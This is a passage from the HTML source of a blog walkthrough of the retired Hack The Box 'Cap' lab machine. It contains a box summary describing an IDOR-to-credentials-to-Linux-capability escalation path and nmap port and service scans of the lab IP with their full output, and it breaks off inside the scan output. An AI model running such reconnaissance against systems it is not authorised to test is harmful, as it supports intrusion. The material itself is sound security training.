<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>HTB Cap Walkthrough | From Bits to Bytes | Cybersecurity Insights by Bhavik Kanejiya</title>
<meta name="keywords" content="Walkthrough, HTB, Linux">
<meta name="description" content="Explore an in-depth walkthrough of the HTB Cap machine, focusing on network packet analysis and leveraging captured data for exploitation. Follow each step from initial reconnaissance to achieving root access, emphasizing practical network security techniques">
<meta name="author" content="Bhavik Kanejiya">
<link rel="canonical" href="https://bhavik-kanejiya.github.io/blog/htb-cap-walkthrough/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css" integrity="sha256-j&#43;ECM6cGvIfy4Is8&#43;XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://bhavik-kanejiya.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://bhavik-kanejiya.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://bhavik-kanejiya.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://bhavik-kanejiya.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://bhavik-kanejiya.github.io/android-chrome-192x192.png">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://bhavik-kanejiya.github.io/blog/htb-cap-walkthrough/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:url" content="https://bhavik-kanejiya.github.io/blog/htb-cap-walkthrough/">
  <meta property="og:site_name" content="From Bits to Bytes | Cybersecurity Insights by Bhavik Kanejiya">
  <meta property="og:title" content="HTB Cap Walkthrough">
  <meta property="og:description" content="Explore an in-depth walkthrough of the HTB Cap machine, focusing on network packet analysis and leveraging captured data for exploitation. Follow each step from initial reconnaissance to achieving root access, emphasizing practical network security techniques">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="blog">
    <meta property="article:published_time" content="2024-11-05T00:00:00+00:00">
    <meta property="article:modified_time" content="2024-11-05T00:00:00+00:00">
    <meta property="article:tag" content="Walkthrough">
    <meta property="article:tag" content="HTB">
    <meta property="article:tag" content="Linux">
    <meta property="og:image" content="https://bhavik-kanejiya.github.io/images/HTB/Cap/E24iZ_yX0AMulP5.jpeg">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://bhavik-kanejiya.github.io/images/HTB/Cap/E24iZ_yX0AMulP5.jpeg">
<meta name="twitter:title" content="HTB Cap Walkthrough">
<meta name="twitter:description" content="Explore an in-depth walkthrough of the HTB Cap machine, focusing on network packet analysis and leveraging captured data for exploitation. Follow each step from initial reconnaissance to achieving root access, emphasizing practical network security techniques">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Blogs",
      "item": "https://bhavik-kanejiya.github.io/blog/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "HTB Cap Walkthrough",
      "item": "https://bhavik-kanejiya.github.io/blog/htb-cap-walkthrough/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "HTB Cap Walkthrough",
  "name": "HTB Cap Walkthrough",
  "description": "Explore an in-depth walkthrough of the HTB Cap machine, focusing on network packet analysis and leveraging captured data for exploitation. Follow each step from initial reconnaissance to achieving root access, emphasizing practical network security techniques",
  "keywords": [
    "Walkthrough", "HTB", "Linux"
  ],
  "articleBody": "Box Info Attribute Details Level Easy OS Linux Box URL https://app.hackthebox.com/machines/Cap Box Status Retired About Box Cap is an easy difficulty Linux machine running an HTTP server that performs administrative functions, including performing network captures. Improper controls result in Insecure Direct Object Reference (IDOR), giving access to another user’s capture. The capture contains plaintext credentials and can be used to gain foothold. A Linux capability is then leveraged to escalate to root. Footprinting Nmap Let’s start with scanning the machine IP with nmap to check what are the services are running on different ports!\n\u003e nmap -p- --min-rate 10000 10.10.10.245 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-04 19:52 IST Warning: 10.10.10.245 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.245 Host is up (0.22s latency). Not shown: 65419 closed tcp ports (conn-refused), 113 filtered tcp ports (no-response) PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 25.15 seconds \u003e nmap -sCV -p 21,22,80 10.10.10.245 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-04 19:53 IST Nmap scan report for 10.10.10.245 Host is up (0.23s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA) | 256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA) |_ 256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519) 80/tcp open http gunicorn |_http-server-header: gunicorn |_http-title: Security Dashboard | fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 404 NOT FOUND | Server: gunicorn | Date: Mon, 04 Nov 2024 14:23:27 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Content-Length: 232 | \u003c!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"\u003e | 404 Not Found | Not Found | The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.\n| GetRequest: | HTTP/1.0 200 OK | Server: gunicorn | Date: Mon, 04 Nov 2024 14:23:19 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Content-Length: 19386 | \u003c!DOCTYPE html\u003e | ",
  "wordCount" : "1328",
  "inLanguage": "en",
  "image":"https://bhavik-kanejiya.github.io/images/HTB/Cap/E24iZ_yX0AMulP5.jpeg","datePublished": "2024-11-05T00:00:00Z",
  "dateModified": "2024-11-05T00:00:00Z",
  "author":[{
    "@type": "Person",
    "name": "Bhavik Kanejiya"
  }],
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://bhavik-kanejiya.github.io/blog/htb-cap-walkthrough/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "From Bits to Bytes | Cybersecurity Insights by Bhavik Kanejiya",
    "logo": {
      "@type": "ImageObject",
      "url": "https://bhavik-kanejiya.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://bhavik-kanejiya.github.io/" accesskey="h" title="Home (Alt + H)">
                <img src="https://bhavik-kanejiya.github.io/apple-touch-icon.png" alt="" aria-label="logo"
                    height="35">Home</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://bhavik-kanejiya.github.io/about/" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="https://bhavik-kanejiya.github.io/blog/" title="Blog">
                    <span>Blog</span>
                </a>
            </li>
            <li>
                <a href="https://bhavik-kanejiya.github.io/archives/" title="Archive">
                    <span>Archive</span>
                </a>
            </li>
            <li>
                <a href="https://bhavik-kanejiya.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      HTB Cap Walkthrough
    </h1>
    <div class="post-meta"><span title='2024-11-05 00:00:00 +0000 UTC'>November 5, 2024</span>&nbsp;·&nbsp;7 min&nbsp;·&nbsp;Bhavik Kanejiya

</div>
  </header> 
<figure class="entry-cover">
        <img loading="eager" src="https://bhavik-kanejiya.github.io/images/HTB/Cap/E24iZ_yX0AMulP5.jpeg" alt="HTB Cap Walkthrough">
        <figcaption>HTB Cap Walkthrough</figcaption>
</figure><div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#box-info" aria-label="Box Info">Box Info</a></li>
                <li>
                    <a href="#footprinting" aria-label="Footprinting">Footprinting</a><ul>
                        
                <li>
                    <a href="#nmap" aria-label="Nmap">Nmap</a></li>
                <li>
                    <a href="#port-21-ftp" aria-label="Port 21 FTP">Port 21 FTP</a></li>
                <li>
                    <a href="#port-22-ssh" aria-label="Port 22 SSH">Port 22 SSH</a></li>
                <li>
                    <a href="#port-80-http" aria-label="Port 80 HTTP">Port 80 HTTP</a></li>
                <li>
                    <a href="#wireshark" aria-label="Wireshark">Wireshark</a></li></ul>
                </li>
                <li>
                    <a href="#getting-user-shell" aria-label="Getting User shell">Getting User shell</a><ul>
                        
                <li>
                    <a href="#ftp-login" aria-label="FTP Login">FTP Login</a></li></ul>
                </li>
                <li>
                    <a href="#getting-root-shell" aria-label="Getting Root shell">Getting Root shell</a><ul>
                        
                <li>
                    <a href="#ssh-login" aria-label="SSH Login">SSH Login</a><ul>
                        
                <li>
                    <a href="#reading-the-application-code" aria-label="Reading the application code">Reading the application code</a></li></ul>
                </li>
                <li>
                    <a href="#linpeasesh" aria-label="Linpease.sh">Linpease.sh</a></li>
                <li>
                    <a href="#what-is-capabilities-and-cap_setuid" aria-label="What is Capabilities and cap_setuid?">What is Capabilities and cap_setuid?</a></li>
                <li>
                    <a href="#how-can-cap_setuid-can-be-used-for-privilege-escalation" aria-label="How can cap_setuid can be used for Privilege Escalation?">How can cap_setuid can be used for Privilege Escalation?</a></li>
                <li>
                    <a href="#how-to-find-the-programs-with-cap_setuid" aria-label="How to find the programs with cap_setuid?">How to find the programs with cap_setuid?</a></li>
                <li>
                    <a href="#get-the-root" aria-label="Get the Root">Get the Root</a></li></ul>
                </li>
                <li>
                    <a href="#conclusion" aria-label="Conclusion">Conclusion</a></li>
                <li>
                    <a href="#key-takeaways" aria-label="Key Takeaways">Key Takeaways</a></li>
                <li>
                    <a href="#references" aria-label="References">References</a></li>
                <li>
                    <a href="#connect-with-me" aria-label="Connect with Me">Connect with Me</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h2 id="box-info">Box Info<a hidden class="anchor" aria-hidden="true" href="#box-info">#</a></h2>
<table>
  <thead>
      <tr>
          <th><strong>Attribute</strong></th>
          <th><strong>Details</strong></th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><strong>Level</strong></td>
          <td>Easy</td>
      </tr>
      <tr>
          <td><strong>OS</strong></td>
          <td>Linux</td>
      </tr>
      <tr>
          <td><strong>Box URL</strong></td>
          <td><a href="https://app.hackthebox.com/machines/Cap">https://app.hackthebox.com/machines/Cap</a></td>
      </tr>
      <tr>
          <td><strong>Box Status</strong></td>
          <td>Retired</td>
      </tr>
      <tr>
          <td><strong>About Box</strong></td>
          <td>Cap is an easy difficulty Linux machine running an HTTP server that performs administrative functions, including performing network captures. Improper controls result in Insecure Direct Object Reference (IDOR), giving access to another user&rsquo;s capture. The capture contains plaintext credentials and can be used to gain foothold. A Linux capability is then leveraged to escalate to root.</td>
      </tr>
  </tbody>
</table>
<h2 id="footprinting">Footprinting<a hidden class="anchor" aria-hidden="true" href="#footprinting">#</a></h2>
<h3 id="nmap">Nmap<a hidden class="anchor" aria-hidden="true" href="#nmap">#</a></h3>
<p>Let&rsquo;s start with scanning the machine IP with nmap to check what are the services are running on different ports!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; nmap -p- --min-rate <span class="m">10000</span> 10.10.10.245
</span></span><span class="line"><span class="cl">Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-11-04 19:52 IST
</span></span><span class="line"><span class="cl">Warning: 10.10.10.245 giving up on port because retransmission cap hit <span class="o">(</span>10<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.245
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.22s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65419</span> closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>, <span class="m">113</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE
</span></span><span class="line"><span class="cl">21/tcp open  ftp
</span></span><span class="line"><span class="cl">22/tcp open  ssh
</span></span><span class="line"><span class="cl">80/tcp open  http
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 25.15 seconds
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&gt; nmap -sCV -p 21,22,80 10.10.10.245
</span></span><span class="line"><span class="cl">Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-11-04 19:53 IST
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.245
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.23s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">21/tcp open  ftp     vsftpd 3.0.3
</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 <span class="o">(</span>RSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c <span class="o">(</span>ECDSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 <span class="o">(</span>ED25519<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp open  http    gunicorn
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: gunicorn
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Security Dashboard
</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings:
</span></span><span class="line"><span class="cl"><span class="p">|</span>   FourOhFourRequest:
</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.0 <span class="m">404</span> NOT FOUND
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Server: gunicorn
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Mon, <span class="m">04</span> Nov <span class="m">2024</span> 14:23:27 GMT
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: close
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">232</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;!DOCTYPE HTML PUBLIC <span class="s2">&#34;-//W3C//DTD HTML 3.2 Final//EN&#34;</span>&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;title&gt;404 Not Found&lt;/title&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;h1&gt;Not Found&lt;/h1&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>   GetRequest:
</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.0 <span class="m">200</span> OK
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Server: gunicorn
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Mon, <span class="m">04</span> Nov <span class="m">2024</span> 14:23:19 GMT
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: close
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">19386</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;!DOCTYPE html&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;html <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;no-js&#34;</span> <span class="nv">lang</span><span class="o">=</span><span class="s2">&#34;en&#34;</span>&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;head&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span>&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;meta http-equiv<span class="o">=</span><span class="s2">&#34;x-ua-compatible&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;ie=edge&#34;</span>&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;title&gt;Security Dashboard&lt;/title&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;viewport&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;width=device-width, initial-scale=1&#34;</span>&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;shortcut icon&#34;</span> <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;image/png&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/images/icon/favicon.ico&#34;</span>&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/css/bootstrap.min.css&#34;</span>&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/css/font-awesome.min.css&#34;</span>&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/css/themify-icons.css&#34;</span>&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/css/metisMenu.css&#34;</span>&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/css/owl.carousel.min.css&#34;</span>&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/css/slicknav.min.css&#34;</span>&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;!-- amchar
</span></span><span class="line"><span class="cl"><span class="p">|</span>   HTTPOptions:
</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.0 <span class="m">200</span> OK
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Server: gunicorn
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Mon, <span class="m">04</span> Nov <span class="m">2024</span> 14:23:20 GMT
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: close
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Allow: OPTIONS, GET, HEAD
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   RTSPRequest:
</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.1 <span class="m">400</span> Bad Request
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: close
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/html
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">196</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;html&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;head&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;title&gt;Bad Request&lt;/title&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;/head&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;body&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;h1&gt;&lt;p&gt;Bad Request&lt;/p&gt;&lt;/h1&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Invalid HTTP Version <span class="p">&amp;</span><span class="c1">#x27;Invalid HTTP Version: &amp;#x27;RTSP/1.0&amp;#x27;&amp;#x27;</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;/body&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>_    &lt;/html&gt;
</span></span><span class="line"><span class="cl"><span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span class="line"><span class="cl">SF-Port80-TCP:V<span class="o">=</span>7.94SVN%I<span class="o">=</span>7%D<span class="o">=</span>11/4%Time<span class="o">=</span>6728D8D7%P<span class="o">=</span>aarch64-unknown-linux-g
</span></span><span class="line"><span class="cl">SF:nu%r<span class="o">(</span>GetRequest,2F4C,<span class="s2">&#34;HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\n
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:Date:\x20Mon,\x2004\x20Nov\x202024\x2014:23:19\x20GMT\r\nConnection:\x2
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:0close\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Lengt
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:h:\x2019386\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20class=\&#34;no-js\&#34;\x20lang
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:=\&#34;en\&#34;&gt;\n\n&lt;head&gt;\n\x20\x20\x20\x20&lt;meta\x20charset=\&#34;utf-8\&#34;&gt;\n\x20\x
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:20\x20\x20&lt;meta\x20http-equiv=\&#34;x-ua-compatible\&#34;\x20content=\&#34;ie=edge\
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:&#34;</span>&gt;<span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20&lt;title&gt;Security<span class="se">\x</span>20Dashboard&lt;/title&gt;<span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>SF:x20&lt;meta<span class="se">\x</span>20name<span class="o">=</span><span class="se">\&#34;</span>viewport<span class="se">\&#34;\x</span>20content<span class="o">=</span><span class="se">\&#34;</span><span class="nv">width</span><span class="o">=</span>device-width,<span class="se">\x</span>20initi
</span></span><span class="line"><span class="cl">SF:al-scale<span class="o">=</span>1<span class="se">\&#34;</span>&gt;<span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20&lt;link<span class="se">\x</span>20rel<span class="o">=</span><span class="se">\&#34;</span>shortcut<span class="se">\x</span>20icon<span class="se">\&#34;\x</span>20typ
</span></span><span class="line"><span class="cl">SF:e<span class="o">=</span><span class="se">\&#34;</span>image/png<span class="se">\&#34;\x</span>20href<span class="o">=</span><span class="se">\&#34;</span>/static/images/icon/favicon<span class="se">\.</span>ico<span class="se">\&#34;</span>&gt;<span class="se">\n\x</span>20<span class="se">\x</span><span class="m">20</span>
</span></span><span class="line"><span class="cl">SF:<span class="se">\x</span>20<span class="se">\x</span>20&lt;link<span class="se">\x</span>20rel<span class="o">=</span><span class="se">\&#34;</span>stylesheet<span class="se">\&#34;\x</span>20href<span class="o">=</span><span class="se">\&#34;</span>/static/css/bootstrap<span class="se">\.</span>mi
</span></span><span class="line"><span class="cl">SF:n<span class="se">\.</span>css<span class="se">\&#34;</span>&gt;<span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20&lt;link<span class="se">\x</span>20rel<span class="o">=</span><span class="se">\&#34;</span>stylesheet<span class="se">\&#34;\x</span>20href<span class="o">=</span><span class="se">\&#34;</span>/stati
</span></span><span class="line"><span class="cl">SF:c/css/font-awesome<span class="se">\.</span>min<span class="se">\.</span>css<span class="se">\&#34;</span>&gt;<span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20&lt;link<span class="se">\x</span>20rel<span class="o">=</span><span class="se">\&#34;</span>stylesh
</span></span><span class="line"><span class="cl">SF:eet<span class="se">\&#34;\x</span>20href<span class="o">=</span><span class="se">\&#34;</span>/static/css/themify-icons<span class="se">\.</span>css<span class="se">\&#34;</span>&gt;<span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20&lt;lin
</span></span><span class="line"><span class="cl">SF:k<span class="se">\x</span>20rel<span class="o">=</span><span class="se">\&#34;</span>stylesheet<span class="se">\&#34;\x</span>20href<span class="o">=</span><span class="se">\&#34;</span>/static/css/metisMenu<span class="se">\.</span>css<span class="se">\&#34;</span>&gt;<span class="se">\n\x</span>20<span class="se">\x</span>
</span></span><span class="line"><span class="cl">SF:20<span class="se">\x</span>20<span class="se">\x</span>20&lt;link<span class="se">\x</span>20rel<span class="o">=</span><span class="se">\&#34;</span>stylesheet<span class="se">\&#34;\x</span>20href<span class="o">=</span><span class="se">\&#34;</span>/static/css/owl<span class="se">\.</span>carous
</span></span><span class="line"><span class="cl">SF:el<span class="se">\.</span>min<span class="se">\.</span>css<span class="se">\&#34;</span>&gt;<span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20&lt;link<span class="se">\x</span>20rel<span class="o">=</span><span class="se">\&#34;</span>stylesheet<span class="se">\&#34;\x</span>20href<span class="o">=</span><span class="se">\&#34;</span>
</span></span><span class="line"><span class="cl">SF:/static/css/slicknav<span class="se">\.</span>min<span class="se">\.</span>css<span class="se">\&#34;</span>&gt;<span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20&lt;!--<span class="se">\x</span>20amchar<span class="s2">&#34;)%r(H
